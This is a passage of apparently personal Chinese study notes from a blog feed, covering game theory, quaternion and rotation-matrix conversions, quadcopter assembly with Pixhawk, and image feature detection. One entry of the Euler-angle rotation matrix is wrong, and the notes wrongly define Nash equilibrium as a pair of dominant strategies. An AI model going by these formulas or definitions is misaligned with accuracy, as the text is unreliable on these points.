<p>具有竞争或对抗性质的行为称为博弈行为。在这类行为中，参加斗争或竞争的各方各自具有不同的目标或利益。为了达到各自的目标和利益，各方必须考虑对手的各种可能的行动方案，并力图选取对自己最为有利或最为合理的方案。比如日常生活中的下棋，打牌等。博弈论就是研究博弈行为中斗争各方是否存在着最合理的行为方案，以及如何找到这个合理的行为方案的数学理论和方法。</p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p align="center">
    <img src="images/game_theory.png" width="100%" alt="博弈论知识结构"/>
</p>
<center>图1 博弈论知识结构</center>

<h2 id="动态博弈"><a href="#动态博弈" class="headerlink" title="动态博弈"></a>动态博弈</h2><p>动态博弈是指参与人的行动有先后顺序，而且行动在后者可以观察到行动在先者的选择，并据此作出相应的选择。</p>
<h2 id="静态博弈"><a href="#静态博弈" class="headerlink" title="静态博弈"></a>静态博弈</h2><p>静态博弈是指博弈中参与者同时采取行动，或者尽管参与者行动的采取有先后顺序，但后行动的人不知道先采取行动的人采取的是什么行动。</p>
<h2 id="完全信息静态博弈"><a href="#完全信息静态博弈" class="headerlink" title="完全信息静态博弈"></a>完全信息静态博弈</h2><h3 id="纳什均衡"><a href="#纳什均衡" class="headerlink" title="纳什均衡"></a>纳什均衡</h3><p>纳什均衡，又称为非合作博弈均衡，是博弈论的一个重要术语，以约翰·纳什命名。在一个博弈过程中，无论对方的策略选择如何，当事人一方都会选择某个确定的策略，则该策略被称作支配性策略。如果两个博弈的当事人的策略组合分别构成各自的支配性策略，那么这个组合就被定义为纳什均衡。</p>
<h1 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h1><ul>
<li><p>局中人（players）：在一场竞赛或博弈中，每一个有决策权的参与者成为一个局中人。只有两个局中人的博弈现象称为“两人博弈”，而多于两个局中人的博弈称为 “多人博弈”。</p>
</li>
<li><p>策略（strategies）：一局博弈中，每个局中人都有选择实际可行的完整的行动方案，即方案不是某阶段的行动方案，而是指导整个行动的一个方案，一个局中人的一个可行的自始至终全局筹划的一个行动方案，称为这个局中人的一个策略。如果在一个博弈中局中人都总共有有限个策略，则称为“有限博弈”，否则称为“无限博弈”。</p>
</li>
<li><p>得失（payoffs）：一局博弈结局时的结果称为得失。每个局中人在一局博弈结束时的得失，不仅与该局中人自身所选择的策略有关，而且与全局中人所取定的一组策略有关。所以，一局博弈结束时每个局中人的“得失”是全体局中人所取定的一组策略的函数，通常称为支付（payoff）函数。</p>
</li>
<li><p>次序（orders）：各博弈方的决策有先后之分，且一个博弈方要作不止一次的决策选择，就出现了次序问题；其他要素相同次序不同，博弈就不同。</p>
</li>
<li><p>博弈涉及到均衡：均衡是平衡的意思，在经济学中，均衡意即相关量处于稳定值。在供求关系中，某一商品市场如果在某一价格下，想以此价格买此商品的人均能买到，而想卖的人均能卖出，此时我们就说，该商品的供求达到了均衡。所谓纳什均衡，它是一稳定的博弈结果。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/博弈论" target="_blank" rel="noopener">博弈论</a>,by wikipedia.</li>
<li><a href="https://wiki.mbalib.com/wiki/博弈论" target="_blank" rel="noopener">博弈论</a>, by 智库百科.</li>
<li><a href="https://zhuanlan.zhihu.com/p/111956556" target="_blank" rel="noopener">漫画：什么是 “智猪博弈” ？</a>,by 小灰.</li>
<li><a href="http://lanyun1103.top/184.html" target="_blank" rel="noopener">Matlab_对策论、微分稳定方程</a>,by Lanyun.</li>
<li><a href="https://blog.csdn.net/witnessai1/article/details/78377544" target="_blank" rel="noopener">Minimax算法及实例分析</a>,by witnessai1.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%BA%9E%E7%89%B9%E9%87%8C%E4%BA%9A%E9%87%91%E6%9C%80%E5%A4%A7%E5%8C%96%E5%8E%9F%E7%90%86" target="_blank" rel="noopener">庞特里亚金最大化原理</a>,by wikipedia.</li>
<li><a href="https://cloud.tencent.com/developer/article/1545920" target="_blank" rel="noopener">AI的博弈论，一份插图教程</a>,by 磐创AI.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>博弈论</tag>
      </tags>
  </entry>
  <entry>
    <title>四元数与旋转矩阵</title>
    <url>/2020/01/15/%E5%9B%9B%E5%85%83%E6%95%B0%E4%B8%8E%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<p>四元数是由爱尔兰数学家威廉·卢云·哈密顿在1843年创立出的数学概念。单位四元数（Unit quaternion）可以用于表示三维空间里的旋转。它与常用的另外两种表示方式（三维正交矩阵和欧拉角）是等价的，但是避免了欧拉角表示法中的万向锁问题。比起三维正交矩阵表示，四元数表示能够更方便地给出旋转的转轴与旋转角。</p>
<h1 id="欧拉角"><a href="#欧拉角" class="headerlink" title="欧拉角"></a>欧拉角</h1><p>欧拉角（Euler Angles）是一种描述三维旋转的方式，根据欧拉旋转定理，任何一个旋转都可以用三个旋转的参数来表示。但欧拉角的描述方式有很多种，并没有一个统一标准。对于定义一个欧拉角，需要明确的内容包括：</p>
<ol>
<li>三个旋转角的组合方式（是xyz还是yzx还是zxy）</li>
<li>旋转角度的参考坐标系统（旋转是相对于固定的坐标系还是相对于自身的坐标系）</li>
<li>使用旋转角度是左手系还是右手系</li>
<li>三个旋转角的记法</li>
</ol>
<h2 id="旋转角的记法"><a href="#旋转角的记法" class="headerlink" title="旋转角的记法"></a>旋转角的记法</h2><table>
<thead>
<tr>
<th>顺序</th>
<th>飞行器</th>
<th>望远镜</th>
<th>符号</th>
<th>角速度</th>
</tr>
</thead>
<tbody><tr>
<td>第一</td>
<td>heading</td>
<td>azimuth</td>
<td>$θ$</td>
<td>yaw</td>
</tr>
<tr>
<td>第二</td>
<td>attitude</td>
<td>elevation</td>
<td>$ϕ$</td>
<td>pitch</td>
</tr>
<tr>
<td>第三</td>
<td>bank</td>
<td>tilt</td>
<td>$ψ$</td>
<td>roll</td>
</tr>
</tbody></table>
<h1 id="旋转矩阵"><a href="#旋转矩阵" class="headerlink" title="旋转矩阵"></a>旋转矩阵</h1><p>对于两个三维点 $p_1(x_1, y_1, z_1)$，$p_2(x_2,y_2,z_2)$，由点 $p_1$ 经过旋转矩阵 $R$ 旋转到 $p_2$，则有：</p>
<p>$$R = \left[ \begin{matrix}<br>r_{11}  &amp; r_{12} &amp; r_{13}\<br>r_{21}  &amp; r_{22} &amp; r_{23}\<br>r_{31}  &amp; r_{32} &amp; r_{33}<br>\end{matrix} \right]$$</p>
<p>$$\left[ \begin{matrix}<br>x_2 \<br>y_2 \<br>z_2<br>\end{matrix} \right] = R<br>\left[ \begin{matrix}<br>x_1 \<br>y_1 \<br>z_1<br>\end{matrix} \right]$$</p>
<p>注：旋转矩阵为正交矩阵$RR^T=E$</p>
<ul>
<li>绕x轴旋转：</li>
</ul>
<p>$$R_x(\theta) = \left[ \begin{matrix}<br>1  &amp; 0 &amp; 0\<br>0  &amp; cos\theta &amp; -sin\theta\<br>0  &amp; sin\theta &amp; cos\theta<br>\end{matrix} \right]$$</p>
<ul>
<li>绕y轴旋转:</li>
</ul>
<p>$$R_y(\theta) = \left[ \begin{matrix}<br>cos\theta  &amp; 0 &amp; sin\theta\<br>0  &amp; 1 &amp; 0\<br>-sin\theta  &amp; 0 &amp; cos\theta<br>\end{matrix} \right]$$</p>
<ul>
<li>绕z轴旋转：</li>
</ul>
<p>$$R_z(\theta) = \left[ \begin{matrix}<br>cos\theta  &amp; -sin\theta &amp; 0\<br>sin\theta  &amp; cos\theta &amp; 0\<br>0  &amp; 0 &amp; 1<br>\end{matrix} \right]$$</p>
<ul>
<li>任意旋转矩阵：</li>
</ul>
<p>任何一个旋转可以表示为依次绕着三个旋转轴旋三个角度的组合。这三个角度称为<strong>欧拉角</strong>。</p>
<h2 id="由欧拉角求旋转矩阵"><a href="#由欧拉角求旋转矩阵" class="headerlink" title="由欧拉角求旋转矩阵"></a>由欧拉角求旋转矩阵</h2><p>设三个轴$x，y，z$的欧拉角分别为$θ_x,θ_y,θ_z$，正弦值、余弦值分别为$s_x, c_x, s_y, c_y, s_z, c_z$那么旋转矩阵为：</p>
<p>$$R(\theta_x,\theta_y,\theta_z)=R_z(\theta_z)R_y(\theta_y)R_x(\theta_x) = \left[ \begin{matrix}<br>c_y c_z  &amp; c_z s_x s_y - c_x s_z &amp; s_x s_z + c_x c_z s_y\<br>c_y s_z  &amp; c_x c_z + s_x s_y s_z &amp; c_x s_y s_z - c_z s_z\<br>-s_y  &amp; c_y s_x &amp; c_x c_y<br>\end{matrix} \right]$$</p>
<h2 id="由旋转矩阵求欧拉角"><a href="#由旋转矩阵求欧拉角" class="headerlink" title="由旋转矩阵求欧拉角"></a>由旋转矩阵求欧拉角</h2><p>$$R = \left[ \begin{matrix}<br>r_{11}  &amp; r_{12} &amp; r_{13}\<br>r_{21}  &amp; r_{22} &amp; r_{23}\<br>r_{31}  &amp; r_{32} &amp; r_{33}<br>\end{matrix} \right] = \left[ \begin{matrix}<br>c_y c_z  &amp; c_z s_x s_y - c_x s_z &amp; s_x s_z + c_x c_z s_y\<br>c_y s_z  &amp; c_x c_z + s_x s_y s_z &amp; c_x s_y s_z - c_z s_z\<br>-s_y  &amp; c_y s_x &amp; c_x c_y<br>\end{matrix} \right]$$</p>
<p>解方程可得：</p>
<p>$$\theta_x = atan2(r_{32}, r_{33})$$<br>$$\theta_y = atan2(-r_{31}, \sqrt{r_{32}^2+r_{33}^2})$$<br>$$\theta_z = atan2(r_{21}, r_{11})$$</p>
<p>注意：atan2()为C++中的函数，atan2(y，x) 求的是y/x的反正切，其返回值为[-pi,+pi]之间的一个数。</p>
<h1 id="四元数"><a href="#四元数" class="headerlink" title="四元数"></a>四元数</h1><p>三维空间的任意旋转，都可以用绕三维空间的某个轴旋转过某个角度来表示，即所谓的Axis-Angle表示方法。这种表示方法里，Axis可用一个三维向量$(x,y,z)$来表示，$θ$可以用一个角度值来表示，直观来讲，一个四维向量$(θ,x,y,z)$就可以表示出三维空间任意的旋转。注意，这里的三维向量$(x,y,z)$只是用来表示axis的方向朝向，因此更紧凑的表示方式是用一个单位向量来表示方向axis，而用该三维向量的长度来表示角度值$θ$。这样以来，可以用一个三维向量$(θ∗x,θ∗y,θ∗z)$就可以表示出三维空间任意的旋转，前提是其中$(x,y,z)$是单位向量。这就是旋转向量(Rotation Vector)的表示方式，OpenCV里大量使用的就是这种表示方法来表示旋转(见OpenCV相机标定部分的rvec)。</p>
<ul>
<li>单位向量(x,y,z)旋转θ角度后的四元数：</li>
</ul>
<p>$$(cos \frac{\theta}{2}, x<em>sin \frac{\theta}{2}, y</em>sin \frac{\theta}{2}, z*sin \frac{\theta}{2})$$</p>
<ul>
<li>对于三维坐标的旋转，可以通过四元数乘法直接操作，与旋转矩阵操作可以等价，但是表示方式更加紧凑，计算量也可以小一些。</li>
</ul>
<h2 id="四元数求旋转矩阵"><a href="#四元数求旋转矩阵" class="headerlink" title="四元数求旋转矩阵"></a>四元数求旋转矩阵</h2><p>已知四元数:</p>
<p>$$\mathbf{q} = q_0 +  q_1 i + q_2 j + q_3 k = [s, \mathbf{v}]$$</p>
<p>利用Rodrigues公式可以由四元数求得旋转矩阵R:</p>
<p>$$R = \left[ \begin{matrix}<br>1 - 2 q_2^2 - 2 q_3^2 &amp; 2q_1 q_2 - 2q_0 q_3 &amp; 2 q_1 q_3 + 2 q_0 q_2 \<br>2q_1 q_2 + 2q_0 q_3 &amp; 1 - 2 q_1^2 - 2 q_3^2 &amp; 2 q_2 q_3 - 2 q_0 q_1 \<br>2 q_1 q_3 - 2 q_0 q_2 &amp; 2 q_2 q_3 + 2 q_0 q_1 &amp; 1 - 2 q_1^2 - 2 q_2^2<br>\end{matrix} \right ]$$</p>
<h2 id="旋转矩阵求四元数"><a href="#旋转矩阵求四元数" class="headerlink" title="旋转矩阵求四元数"></a>旋转矩阵求四元数</h2><p>给出其中一种情况的计算方法：</p>
<p>$$q_0 = \frac{\sqrt{1+r_{11}+r_{22}+r_{33}}}{2}$$<br>$$q_1 = \frac{r_{32}-r_{23}}{4q_0}$$<br>$$q_2 = \frac{r_{13}-r_{31}}{4q_0}$$<br>$$q_3 = \frac{r_{21}-r_{12}}{4q_0}$$</p>
<p>其中要满足 $q_0 \neq 0$，$1+r_{11}+r_{22}+r_{33}&gt;0$，即 $1+tr(R)&gt;0$</p>
<h2 id="四元数进行姿态变换"><a href="#四元数进行姿态变换" class="headerlink" title="四元数进行姿态变换"></a>四元数进行姿态变换</h2><p>假设坐标系O1上的点P1(x1, y1, z1), 存在变换矩阵Ｒ, 可计算P1点在坐标系O2上的坐标值为P2(x2, y2, z2)：<br>$$P2=R∗P1$$</p>
<p>矩阵Ｒ对应的四元数为q, 则使用四元数计算为:<br>首先三维空间点用一个虚四元数来描述：P1=[0, x1, y1, z1], P2=[0, x2, y2, z2]<br>则P2和P1将计算关系为：</p>
<p>$$P_2=qP_1q^{-1}$$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E5%85%83%E6%95%B8" target="_blank" rel="noopener">四元数</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9B%9B%E5%85%83%E6%95%B0%E4%B8%8E%E7%A9%BA%E9%97%B4%E6%97%8B%E8%BD%AC" target="_blank" rel="noopener">四元数与空间旋转</a>,by wikipedia.</li>
<li><a href="http://www.p-chao.com/2017-08-29/%E4%BB%8E%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5%E8%AE%A1%E7%AE%97%E6%AC%A7%E6%8B%89%E8%A7%92/" target="_blank" rel="noopener">从旋转矩阵计算欧拉角</a>,by PengChao.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/65446125" target="_blank" rel="noopener">旋转变换（一）旋转矩阵</a>,by csxiaoshui.</li>
<li><a href="https://blog.csdn.net/lql0716/article/details/72597719" target="_blank" rel="noopener">旋转矩阵、欧拉角、四元数理论及其转换关系</a>,by jason_ql.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/65437633" target="_blank" rel="noopener">旋转变换（二）欧拉角</a>,by csxiaoshui.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E8%A7%92" target="_blank" rel="noopener">欧拉角</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/85108850" target="_blank" rel="noopener">欧拉角细节/旋转顺序/内旋外旋</a>,by 能儿.</li>
<li><a href="https://blog.csdn.net/Sandy_WYM_/article/details/84328395" target="_blank" rel="noopener">四元数运算与姿态变换</a>,by Yoyo_wym.</li>
<li><a href="https://www.mathworks.com/help/aerotbx/flight-parameters-1.html?s_tid=CRUX_lftnav" target="_blank" rel="noopener">Flight Parameters and Quaternion Math</a>,by mathwork.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>四旋翼无人机制作简易教程</title>
    <url>/2019/03/25/%E5%9B%9B%E6%97%8B%E7%BF%BC%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%88%B6%E4%BD%9C%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>四轴飞行器又称四旋翼、四转子，是一种多轴飞行器，有四个旋翼来悬停、维持姿态及平飞。和固定翼飞机不同，它通过旋翼提供的推力使飞机升空。它的四个旋翼大小相同，分布位置接近对称。对于简单的设计来说，仅仅通过调整不同旋翼之间的相对速度来调节不同位置的推力，并克服每个旋翼之间的反扭力矩，就可以控制飞机维持姿态、或完成各种机动飞行。下面简单介绍四旋翼无人机的制作过程。</p>
<h1 id="无人机硬件装配"><a href="#无人机硬件装配" class="headerlink" title="无人机硬件装配"></a>无人机硬件装配</h1><p>组装一件无人机所需配件及其连接示意图如图1所示。</p>
<p align="center">
    <img src="images/drone_connect.jpg" width="100%" alt="四旋翼无人机机硬件连接图"/>
</p>
<center>图1  四旋翼无人机机硬件连接图</center>

<p>所需配件主要有：</p>
<ul>
<li>机身骨架</li>
<li>一对正浆和一对反浆。注意浆的固定方向与电机旋转方向要一致。</li>
<li>遥控器及接收机</li>
<li>无刷电机及电调</li>
<li>ppm sum receiver</li>
<li>pixhawk 1，内含安全开关和蜂鸣器</li>
<li>gps</li>
<li>锂电池</li>
<li>云台和摄像头（可选）</li>
<li>telemetry无线收发装置与图传（可选）</li>
</ul>
<h1 id="无人机软件调试"><a href="#无人机软件调试" class="headerlink" title="无人机软件调试"></a>无人机软件调试</h1><h2 id="遥控器与接收机之间对码"><a href="#遥控器与接收机之间对码" class="headerlink" title="遥控器与接收机之间对码"></a>遥控器与接收机之间对码</h2><p>遥控器和接收机之间是配对的，使用之前必须对码，可根据遥控器的使用说明书进行操作。其连接示意图如图2所示。</p>
<p align="center">
    <img src="images/pair_code.png" width="80%" alt="航模遥控器与接收机对码示意图"/>
</p>
<center>图2  航模遥控器与接收机对码示意图</center>

<h2 id="电子调速器的油门行程和进角设置"><a href="#电子调速器的油门行程和进角设置" class="headerlink" title="电子调速器的油门行程和进角设置"></a>电子调速器的油门行程和进角设置</h2><p>电子调速器主要控制马达的转速，其调试连接示意图如图3所示。</p>
<p align="center">
    <img src="images/esc.jpg" width="80%" alt="电子调速器连接示意图"/>
</p>
<center>图3 电子调速器连接示意图</center>

<p>如图3所示将电子调速器连接后，即开始设置油门行程和电子调速器进角。设置油门行程即让电子调速器知道遥控器的油门输入范围。而电子调速器进角有高中低之分，类似于汽车档位。低进角速度慢但扭力大，高进角速度快但扭力小，一般设置电子调速器中进角即可满足大多数要求。具体设置说明参照电子调速器使用说明书。</p>
<h2 id="pixhawk飞控平台的设置"><a href="#pixhawk飞控平台的设置" class="headerlink" title="pixhawk飞控平台的设置"></a>pixhawk飞控平台的设置</h2><p>Pixhawk是PX4飞行堆栈的标准微控制器平台。在pixhawk硬件平台上可运行PX4和ArduPilot两种不同的自动驾驶仪软件套件。如果在pixhawk平台上安装px4自驾仪软件，则使用QGroundControl地面站软件进行设置；如果在pixhawk平台上安装ArduPilot自驾仪软件，则使用MissionPlanner地面站软件进行设置。</p>
<p>Pixhawk和GPS按照方向捆绑好后，按照地面站软件的指示进行设置。设置好之后，长按Pixhawk的安全开关，再将遥控器油门拉动底并推向最右方，即可解锁Pixhawk。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/四轴飞行器" target="_blank" rel="noopener">四轴飞行器</a>,by wikipedia.</li>
<li><a href="http://dev.px4.io/" target="_blank" rel="noopener">PX4 autopilot</a>, by px4 homepage.</li>
<li><a href="http://www.crazepony.com/book/" target="_blank" rel="noopener">Crazepony开源四轴飞行器</a>,by crazepony.</li>
<li><a href="https://en.wikipedia.org/wiki/ArduPilot" target="_blank" rel="noopener">ArduPilot</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/PX4_autopilot" target="_blank" rel="noopener">PX4 autopilot</a>,by wikipedia.</li>
<li><a href="https://www.roboticschina.com/news/201703071540.html" target="_blank" rel="noopener">从建模分析到控制器设计，四轴飞行器是怎样炼成的？</a>,by 机器人.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
      </tags>
  </entry>
  <entry>
    <title>图像特征检测与描述</title>
    <url>/2019/06/02/%E5%9B%BE%E5%83%8F%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%8F%8F%E8%BF%B0/</url>
    <content><![CDATA[<p>特征检测（英语：Feature detection）是计算机视觉和图像处理中的一个概念。它指的是使用计算机提取图像信息，决定每个图像的点是否属于一个图像特征。特征检测的结果是把图像上的点分为不同的子集，这些子集往往属于孤立的点、连续的曲线或者连续的区域。</p>
<h1 id="图像特征分类"><a href="#图像特征分类" class="headerlink" title="图像特征分类"></a>图像特征分类</h1><p>特征的精确定义往往由问题或者应用类型决定。特征是一个数字图像中“有趣”的部分，它是许多计算机图像分析算法的起点。因此一个算法是否成功往往由它使用和定义的特征决定。因此特征检测最重要的一个特性是“可重复性”：同一场景的不同图像所提取的特征应该是相同的。</p>
<p>特征检测是图象处理中的一个初级运算，也就是说它是对一个图像进行的第一个运算处理。它检查每个像素来确定该像素是否代表一个特征。假如它是一个更大的算法的一部分，那么这个算法一般只检查图像的特征区域。作为特征检测的一个前提运算，输入图像一般通过高斯模糊核在尺度空间中被平滑。此后通过局部导数运算来计算图像的一个或多个特征。</p>
<p>常用的图像特征分成以下四类：</p>
<ul>
<li>边缘</li>
</ul>
<p>边缘指组成两个图像区域之间边界（或边缘）的像素。一般一个边缘的形状可以是任意的，还可能包括交叉点。在实践中边缘一般被定义为图像中拥有大的梯度的点组成的子集。一些常用的算法还会把梯度高的点联系起来来构成一个更完善的边缘的描写。</p>
<ul>
<li>角</li>
</ul>
<p>角指图像中点似的特征，在局部它有两维结构。早期的算法首先进行边缘检测，然后分析边缘的走向来寻找边缘突然转向（角）。后来发展的算法不再需要边缘检测这个步骤，而是可以直接在图像梯度中寻找高度曲率。</p>
<ul>
<li>区域</li>
</ul>
<p>与角不同的是区域描写一个图像中的一个区域性的结构，但是区域也可能仅由一个像素组成，因此许多区域检测也可以用来监测角。一个区域监测器检测图像中一个对于角监测器来说太平滑的区域。</p>
<p>区域检测可以被想象为把一张图像缩小，然后在缩小的图像上进行角检测。</p>
<ul>
<li>脊</li>
</ul>
<p>长条形的物体被称为脊。在实践中脊可以被看作是代表对称轴的一维曲线，此外局部针对于每个脊像素有一个脊宽度。从灰梯度图像中提取脊要比提取边缘、角和区域困难。在空中摄影中往往使用脊检测来分辨道路，在医学图像中它被用来分辨血管。</p>
<h1 id="边缘检测"><a href="#边缘检测" class="headerlink" title="边缘检测"></a>边缘检测</h1><p>边缘检测（英语：Edge detection）是图像处理和计算机视觉中的基本问题，边缘检测的目的是标识数字图像中亮度变化明显的点。图像属性中的显著变化通常反映了属性的重要事件和变化。这些包括（i）深度上的不连续、（ii）表面方向不连续、（iii）物质属性变化和（iv）场景照明变化。 边缘检测是图像处理和计算机视觉中，尤其是特征检测中的一个研究领域。</p>
<p>图像边缘检测大幅度地减少了数据量，并且剔除了可以认为不相关的信息，保留了图像重要的结构属性。有许多方法用于边缘检测，它们的绝大部分可以划分为两类：基于查找一类和基于零穿越的一类。基于查找的方法通过寻找图像一阶导数中的最大和最小值来检测边界，通常是将边界定位在梯度最大的方向。基于零穿越的方法通过寻找图像二阶导数零穿越来寻找边界，通常是Laplacian过零点或者非线性差分表示的过零点。</p>
<h2 id="边缘检测的方法"><a href="#边缘检测的方法" class="headerlink" title="边缘检测的方法"></a>边缘检测的方法</h2><p>有许多用于边缘检测的方法，他们大致可分为两类：</p>
<ul>
<li>基于搜索的边缘检测</li>
</ul>
<p>基于搜索的边缘检测方法首先计算边缘强度，通常用一阶导数表示，例如梯度模;然后，用计算估计边缘的局部方向，通常采用梯度的方向，并利用此方向找到局部梯度模的最大值.</p>
<ul>
<li>基于零交叉的边缘检测</li>
</ul>
<p>基于零交叉的方法找到由图像得到的二阶导数的零交叉点来定位边缘.通常用拉普拉斯算子或非线性微分方程的零交叉点，我们将在后面的小节中描述.</p>
<p>滤波做为边缘检测的预处理通常是必要的，通常采用高斯滤波.</p>
<p>已发表的边缘检测方法应用计算边界强度的度量，这与平滑滤波有本质的不同.正如许多边缘检测方法依赖于图像梯度的计算，他们用不同种类的滤波器来估计x-方向和y-方向的梯度.</p>
<h1 id="角检测"><a href="#角检测" class="headerlink" title="角检测"></a>角检测</h1><p>角检测（英语：Corner detection）或兴趣点检测（interest point detection），是计算机视觉系统中用来提取特征以及推测图像内容的一种方法.角检测的应用很广，经常用在运动检测，跟踪，图像镶嵌（image mosaicing），全景图缝合（panorama stiching），三维建模以及物体识别中.</p>
<h2 id="问题定义"><a href="#问题定义" class="headerlink" title="问题定义"></a>问题定义</h2><p>两条边的交点形成一个角（点）。而图像的要点（也称为受关注点）是指图像中具有代表性以及稳健性（即指该点能够在有噪声干扰的情况下也能稳定的被定位，在大陆亦被称为：鲁棒性）的点。也就是说，要点可以是角（点），也可以不是，例如局部亮点或暗点，线段终点，或者曲线上的曲率最大值点。在实际应用中，很多所谓的（角）点检测算法其实是检测要点，而不仅仅是角（点）。所以，如果我们只想检测角的话，还需要对检测出的要点进一步分析。</p>
<h2 id="角检测的方法"><a href="#角检测的方法" class="headerlink" title="角检测的方法"></a>角检测的方法</h2><p>在现实世界中，角点对应于物体的拐角，道路的十字路口、丁字路口等。从图像分析的角度来定义角点可以有以下两种定义：</p>
<ul>
<li>角点可以是两个边缘的角点；</li>
<li>角点是邻域内具有两个主方向的特征点；</li>
<li>前者往往需要对图像边缘进行编码，这在很大程度上依赖于图像的分割与边缘提取，具有相当大的难度和计算量，且一旦待检测目标局部发生变化，很可能导致操作的失败。早期主要有Rosenfeld和Freeman等人的方法，后期有CSS等方法。</li>
</ul>
<p>基于图像灰度的方法通过计算点的曲率及梯度来检测角点，避免了第一类方法存在的缺陷，此类方法主要有Moravec算子、Forstner算子、Harris算子、SUSAN算子等。</p>
<p align="center">
    <img src="images/cornerCheck.jpg" width="90%" alt="角检测方法发展历程"/>
</p>
<center>图1  角检测方法发展历程</center>

<h3 id="Harris算法"><a href="#Harris算法" class="headerlink" title="Harris算法"></a>Harris算法</h3><p>Harris角点检测基本原理如图2所示。人眼对角点的识别通常是在一个局部的小区域或小窗口完成的。如果在各个方向上移动这个特征的小窗口，窗口内区域的灰度发生了较大的变化，那么就认为在窗口内遇到了角点。如果这个特定的窗口在图像各个方向上移动时，窗口内图像的灰度没有发生变化，那么窗口内就不存在角点；如果窗口在某一个方向移动时，窗口内图像的灰度发生了较大的变化，而在另一些方向上没有发生变化，那么，窗口内的图像可能就是一条直线的线段。</p>
<p align="center">
    <img src="images/harris.png" width="90%" alt="Harris角点检测基本原理"/>
</p>
<center>图2  Harris角点检测基本原理</center>

<h3 id="SIFT算法"><a href="#SIFT算法" class="headerlink" title="SIFT算法"></a>SIFT算法</h3><p>SIFT(Scale-invariant features transform, 尺度不变特征变换)是一种检测局部特征的算法，该算法通过求一幅图中的特征点（interest points,or corner points）及其有关scale 和 orientation 的描述子得到特征并进行图像特征点匹配，获得了良好效果。SIFT特征不只具有尺度不变性，即使改变旋转角度，图像亮度或拍摄视角，仍然能够得到好的检测效果。该算法由 David Lowe在1999年所发表，2004年完善总结。</p>
<p>SIFT算子是把图像中检测到的特征点用一个128维的特征向量进行描述，因此一幅图像经过SIFT算法后表示为一个128维的特征向量集，该特征向量集具有对图像缩放，平移，旋转不变的特征，对于光照、仿射和投影变换也有一定的不变性，是一种非常优秀的局部特征描述算法。</p>
<p>SIFT算法的流程分别为：</p>
<ol>
<li>尺度空间极点检测</li>
<li>关键点精确定位</li>
<li>关键点的方向确定</li>
<li>特征向量的生成</li>
</ol>
<h3 id="ORB算法"><a href="#ORB算法" class="headerlink" title="ORB算法"></a>ORB算法</h3><p>ORB的全称是ORiented Brief，是文章ORB: an efficient alternative to SIFT or SURF中提出的一种新的角点检测与特征描述算法。实际上，ORB算法是将FAST角点检测与BRIEF特征描述结合并进行了改进。</p>
<p>ORB特征由关键点和描述子两部分组成。它的关键点称为“Oriented Fast”，是一种改进的FAST角点。描述子称为“BRIEF(Binary Robust Independent Elementary Feature)”。因此提取ORB特征分为如下两个步骤：</p>
<ul>
<li>提取FAST角点(相较于原版FAST角点，ORB中计算了特征点的主方向，为后续的BRIEF描述子增加了旋转不变性)</li>
<li>计算BRIEF描述子</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">特征检测</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">边缘检测</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%A7%92%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">角检测</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/ronny/p/4009425.html" target="_blank" rel="noopener">Harris角点</a>,by Ronny.</li>
<li><a href="https://blog.csdn.net/lhanchao/article/details/52345845" target="_blank" rel="noopener">特征点匹配——SIFT算法详解</a>,by lhanchao.</li>
<li><a href="http://zhaoxuhui.top/blog/2018/01/29/ORB%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96-%E5%8C%B9%E9%85%8D%E5%8F%8A%E5%AE%9E%E7%8E%B0.html" target="_blank" rel="noopener">ORB特征提取、匹配及实现</a>,by zhaoxuhui.</li>
<li><a href="https://zhuanlan.zhihu.com/p/52140541" target="_blank" rel="noopener">传统计算机视觉中图像特征匹配方法的原理介绍（SIFT 和 ORB）</a>,by Zhang Bin.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>国际标准大气模型的使用方法</title>
    <url>/2022/07/13/%E5%9B%BD%E9%99%85%E6%A0%87%E5%87%86%E5%A4%A7%E6%B0%94%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
